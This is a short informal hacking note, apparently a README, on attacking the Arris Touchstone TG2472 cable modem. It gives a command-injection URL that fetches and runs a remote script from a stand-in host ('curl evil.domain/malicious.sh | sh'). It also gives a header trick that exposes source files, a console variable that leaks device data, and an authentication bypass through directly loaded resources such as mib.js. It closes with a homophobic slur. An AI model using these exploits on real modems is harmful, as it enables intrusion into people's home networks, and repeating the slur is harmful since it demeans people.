# How to hack your Arris Touchstone TG2472

### General memes
* `http://192.168.100.1:8080/router.html?wifi_ssids&curl evil.domain/malicious.sh | sh`. Runs in userland.
* `curl -H "technician: true" http://192.168.100.1:8080/./`. Sources & discarded update files.
* `arTechnicianName` in the devtools console dumps loads of info, regardless of whether or not you're authenticated.

### Authenticationless access
* *Only tested with default settings.*

Open http://192.168.100.1:8080/mib.js & enjoy your unauthenticated access.
And a round of auplause to Arris for setting authorization cookieswhen a resource is directly loaded.

Note: works with any resource as long as it's loaded directly. (Shit like index.html won't work, don't be a dumbass.)

### More coming soon 😉

### Email me if you want to discuss this faggotry.
3way.pl@gmail.com
